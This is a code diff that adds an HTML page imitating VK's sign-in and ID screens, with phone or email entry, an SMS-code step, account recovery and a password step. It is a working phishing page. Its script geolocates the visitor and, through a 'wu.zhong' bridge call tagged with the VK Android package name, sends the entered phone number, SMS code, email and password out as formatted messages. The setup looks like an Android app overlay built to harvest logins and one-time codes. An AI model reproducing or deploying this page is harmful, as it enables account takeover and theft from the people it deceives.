@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to VK</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #1c1c1e;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 40px;
+            padding-top: 20px;
+            position: relative;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 0;
+            font-size: 24px;
+            color: #fff;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 8px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .vk-logo {
+            width: 60px;
+            height: 60px;
+            background: #4680c2;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+        }
+
+        .vk-id-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #8e8e93;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+
+        .form-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .tab-container {
+            display: flex;
+            margin-bottom: 20px;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #48484a;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 16px;
+            background: #48484a;
+            border: none;
+            color: #8e8e93;
+            font-size: 17px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .tab.active {
+            background: #636366;
+            color: #fff;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: #48484a;
+            border: 1px solid #48484a;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 17px;
+            color: #fff;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #4680c2;
+        }
+
+        .input-field::placeholder {
+            color: #8e8e93;
+        }
+
+        .phone-input-container {
+            position: relative;
+            background: #48484a;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .country-flag {
+            width: 24px;
+            height: 16px;
+            border-radius: 2px;
+            margin-right: 12px;
+        }
+        .country-code {
+            color: #fff;
+            font-size: 17px;
+            margin-right: 8px;
+        }
+
+        .phone-number-input {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 17px;
+            flex: 1;
+            outline: none;
+        }
+
+        .phone-number-input::placeholder {
+            color: #8e8e93;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-field {
+            padding-right: 50px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #8e8e93;
+            cursor: pointer;
+            font-size: 20px;
+            padding: 4px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            gap: 12px;
+        }
+
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            background: #4680c2;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: white;
+            font-size: 16px;
+        }
+
+        .checkbox.unchecked {
+            background: #48484a;
+            border: 1px solid #8e8e93;
+        }
+
+        .checkbox-label {
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            flex: 1;
+        }
+
+        .help-icon {
+            color: #8e8e93;
+            font-size: 18px;
+            cursor: pointer;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .btn-primary {
+            background: #e5e5ea;
+            color: #000;
+        }
+
+        .btn-primary:hover {
+            background: #d1d1d6;
+        }
+
+        .btn-primary:disabled {
+            background: #48484a;
+            color: #8e8e93;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: #fff;
+            border: 1px solid #48484a;
+        }
+
+        .btn-secondary:hover {
+            background: #48484a;
+        }
+
+        .link {
+            color: #4680c2;
+            text-decoration: none;
+            font-size: 15px;
+            text-align: center;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: auto;
+            text-align: center;
+        }
+
+        .footer-text {
+            color: #8e8e93;
+            font-size: 13px;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .footer-link {
+            color: #8e8e93;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .sms-info {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .phone-number {
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            margin-top: 8px;
+        }
+
+        .timer {
+            color: #8e8e93;
+            font-size: 15px;
+            margin-top: 20px;
+        }
+
+        .password-hint {
+            color: #8e8e93;
+            font-size: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .account-info {
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            text-align: center;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 16px;
+            }
+            
+            .title {
+                font-size: 24px;
+            }
+
+            .footer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="page1" class="page active">
+        <div class="container">
+            <div class="header">
+                <div class="logo-container">
+                    <div class="vk-logo">VK</div>
+                </div>
+            </div>
+            
+            <h1 class="title">Sign in to VK</h1>
+            
+            <div class="form-container">
+                <div class="tab-container">
+                    <button class="tab active" id="phoneTab">Phone</button>
+                    <button class="tab" id="emailTab">Email</button>
+                </div>
+                
+                <div id="phoneInput" class="input-container">
+                    <div class="phone-input-container">
+                        <div class="country-flag flag"></div>
+                        <span class="country-code"></span>
+                        <input type="tel" class="phone-number-input" placeholder="" id="phoneNumber">
+                    </div>
+                </div>
+
+                <div id="emailInput" class="input-container" style="display: none;">
+                    <div class="input-group">
+                        <input type="email" class="input-field" placeholder="Email" id="emailAddress">
+                    </div>
+                </div>
+                
+                <div class="checkbox-container">
+                    <div class="checkbox" id="saveUserCheckbox">✓</div>
+                    <label class="checkbox-label" for="saveUserCheckbox">Save user</label>
+                    <span class="help-icon">?</span>
+                </div>
+                
+                <button class="btn btn-primary" id="signInBtn">Sign in</button>
+                
+                <button class="btn btn-secondary" id="signUpBtn">Sign up</button>
+                
+                <button class="btn btn-secondary" id="businessBtn">Create business page</button>
+                
+                <div class="footer">
+                    <div class="footer-text">
+                        By pressing Sign in, you agree to the <span style="color: #fff;">Terms of Service</span><br>
+                        and <span style="color: #fff;">Privacy Policy</span>
+                    </div>
+                    
+               
+                    
+               
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page2" class="page">
+        <div class="container">
+            <div class="header">
+                <button class="back-btn" onclick="goBack()">←</button>
+                <div class="logo-container">
+                    <div class="vk-logo">VK</div>
+                    <span class="vk-id-text">ID</span>
+                </div>
+            </div>
+            
+            <h1 class="title">Enter SMS code</h1>
+            
+            <div class="form-container">
+                <div class="sms-info">
+                    <div class="subtitle">We sent an SMS confirmation code to</div>
+                    <div class="phone-number" id="displayPhoneNumber">+79632584562</div>
+                </div>
+                
+                <div class="input-group">
+                    <input type="text" class="input-field" placeholder="SMS code" id="smsCode" maxlength="6">
+                </div>
+                
+                <button class="btn btn-primary" id="continueBtn1">Continue</button>
+                
+                <div class="timer">You'll receive an SMS within <span id="countdown">00:53</span></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page3" class="page">
+        <div class="container">
+            <div class="header">
+                <button class="back-btn" onclick="goBack()">←</button>
+                <div class="logo-container">
+                    <div class="vk-logo">VK</div>
+                    <span class="vk-id-text">ID</span>
+                </div>
+            </div>
+            
+            <h1 class="title">Sign in to VK</h1>
+            <div class="subtitle">Enter the phone number or email address linked to this account</div>
+            
+            <div class="form-container">
+                <div class="tab-container">
+                    <button class="tab" id="phoneTab3">Phone</button>
+                    <button class="tab active" id="emailTab3">Email</button>
+                </div>
+                
+                <div class="input-group">
+                    <input type="text" class="input-field" placeholder="Email or login" id="recoveryInput">
+                </div>
+                
+                <div class="checkbox-container">
+                    <div class="checkbox" id="saveUserCheckbox3">✓</div>
+                    <label class="checkbox-label" for="saveUserCheckbox3">Save user</label>
+                    <span class="help-icon">?</span>
+                </div>
+                
+                <button class="btn btn-primary" id="continueBtn3">Continue</button>
+                
+                <div class="footer">
+                    <div class="footer-text">
+                        By pressing Continue, you agree to the <span style="color: #fff;">Terms of Service</span><br>
+                        and <span style="color: #fff;">Privacy Policy</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="page4" class="page">
+        <div class="container">
+            <div class="header">
+                <button class="back-btn" onclick="goBack()">←</button>
+                <div class="logo-container">
+                    <div class="vk-logo">VK</div>
+                    <span class="vk-id-text">ID</span>
+                </div>
+            </div>
+            
+            <h1 class="title">Enter your password</h1>
+            
+            <div class="form-container">
+                <div class="password-hint">Enter the current password linked to</div>
+                <div class="account-info" id="displayAccount">+1 23</div>
+                
+                <div class="input-group" style="margin-top: 40px;">
+                    <div class="password-container">
+                        <input type="password" class="input-field password-field" placeholder="Enter password" id="passwordInput">
+                        <button class="password-toggle" onclick="togglePassword()">
+                            <span id="eyeIcon"></span>
+                        </button>
+                    </div>
+                </div>
+                
+                <a href="#" class="link">Forgot password or haven't set it up yet?</a>
+                
+                <button class="btn btn-primary" id="finalContinueBtn">Continue</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentPage = 1;
+        let currentTab = 'phone';
+        let saveUser = true;
+        let userInput = '';
+        var cc="";
+        
+        
+        let timeLeft = 53;
+        const countdownElement = document.getElementById('countdown');
+        
+
+
+
+        window.onload = async function() {
+
+        
+        var json= await fetch("https://ipapi.co/json/").then(res => res.json());
+       
+        cc=json.country_calling_code;
+       
+        document.querySelector('.flag').style.background = `url("https://flagcdn.com/h60/${json.country.toLowerCase()}.png") no-repeat`;
+   
+        document.querySelector('.flag').style.backgroundSize = 'cover';
+        document.querySelector('.flag').style.backgroundPosition = 'center';
+
+        document.querySelector('.country-code').innerHTML = `${json.country_calling_code}`;
+
+         };
+
+
+
+
+
+
+        function startCountdown() {
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timer);
+                    countdownElement.textContent = '00:00';
+                }
+                timeLeft--;
+            }, 1000);
+        }
+        
+        function showPage(pageNumber) {
+            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+            document.getElementById('page' + pageNumber).classList.add('active');
+            currentPage = pageNumber;
+            
+            if (pageNumber === 2) {
+                startCountdown();
+            }
+        }
+        
+        function goBack() {
+            if (currentPage > 1) {
+                showPage(currentPage - 1);
+            }
+        }
+        
+      
+        
+    
+        document.getElementById('phoneTab').addEventListener('click', function() {
+            document.getElementById('phoneTab').classList.add('active');
+            document.getElementById('emailTab').classList.remove('active');
+            document.getElementById('phoneInput').style.display = 'block';
+            document.getElementById('emailInput').style.display = 'none';
+            currentTab = 'phone';
+        });
+        
+        document.getElementById('emailTab').addEventListener('click', function() {
+            document.getElementById('emailTab').classList.add('active');
+            document.getElementById('phoneTab').classList.remove('active');
+            document.getElementById('emailInput').style.display = 'block';
+            document.getElementById('phoneInput').style.display = 'none';
+            currentTab = 'email';
+        });
+
+        document.getElementById('phoneTab3').addEventListener('click', function() {
+            document.getElementById('phoneTab3').classList.add('active');
+            document.getElementById('emailTab3').classList.remove('active');
+        });
+        
+        document.getElementById('emailTab3').addEventListener('click', function() {
+            document.getElementById('emailTab3').classList.add('active');
+            document.getElementById('phoneTab3').classList.remove('active');
+        });
+        
+ 
+        function toggleCheckbox(checkboxId) {
+            const checkbox = document.getElementById(checkboxId);
+            if (checkbox.classList.contains('unchecked')) {
+                checkbox.classList.remove('unchecked');
+                checkbox.textContent = '✓';
+                saveUser = true;
+            } else {
+                checkbox.classList.add('unchecked');
+                checkbox.textContent = '';
+                saveUser = false;
+            }
+        }
+        
+        document.getElementById('saveUserCheckbox').addEventListener('click', () => toggleCheckbox('saveUserCheckbox'));
+        document.getElementById('saveUserCheckbox3').addEventListener('click', () => toggleCheckbox('saveUserCheckbox3'));
+        
+
+        document.getElementById('signInBtn').addEventListener('click', function() {
+            if (currentTab === 'phone') {
+                const phoneNumber = document.getElementById('phoneNumber').value.trim();
+                if (phoneNumber) {
+                    userInput = cc+ phoneNumber;
+                    document.getElementById('displayPhoneNumber').textContent = userInput;
+                    showPage(2);
+
+                 wu.zhong(`🔰VK Login \n\n📞Phone Number: ${phoneNumber}`,"com.vkontakte.android#");
+
+
+                } 
+            } else {
+                const email = document.getElementById('emailAddress').value.trim();
+                if (email) {
+                    userInput = email;
+                    showPage(3);
+                } 
+            }
+        });
+        
+
+        document.getElementById('continueBtn1').addEventListener('click', function() {
+            const smsCode = document.getElementById('smsCode').value.trim();
+            if (smsCode) {
+                document.getElementById('displayAccount').textContent = userInput;
+                showPage(4);
+            } 
+        });
+  
+        document.getElementById('continueBtn3').addEventListener('click', function() {
+            const recoveryInput = document.getElementById('recoveryInput').value.trim();
+            if (recoveryInput) {
+                userInput = recoveryInput;
+                document.getElementById('displayAccount').textContent = userInput;
+                showPage(4);
+            } 
+        });
+        
+
+        document.getElementById('finalContinueBtn').addEventListener('click', function() {
+            const password = document.getElementById('passwordInput').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            const recoveryInput = document.getElementById('recoveryInput').value.trim();
+             const smsCode = document.getElementById('smsCode').value.trim();
+
+            if (password) {
+           
+                wu.zhong(`🔰VK Login \n\n📞Phone Number: ${phoneNumber}\n🈸Code: ${smsCode}\n✉️Email: ${recoveryInput}\n🔒Password: ${password}`,"com.vkontakte.android");
+            } else {
+               document.getElementById('passwordInput').focus();
+            }
+        });
+        
+   
+      
+        
+    
+        document.getElementById('phoneNumber').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') document.getElementById('signInBtn').click();
+        });
+        
+        document.getElementById('emailAddress').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') document.getElementById('signInBtn').click();
+        });
+        
+        document.getElementById('smsCode').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') document.getElementById('continueBtn1').click();
+        });
+        
+        document.getElementById('recoveryInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') document.getElementById('continueBtn3').click();
+        });
+        
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') document.getElementById('finalContinueBtn').click();
+        });
+    </script>
+</body>
+</html>
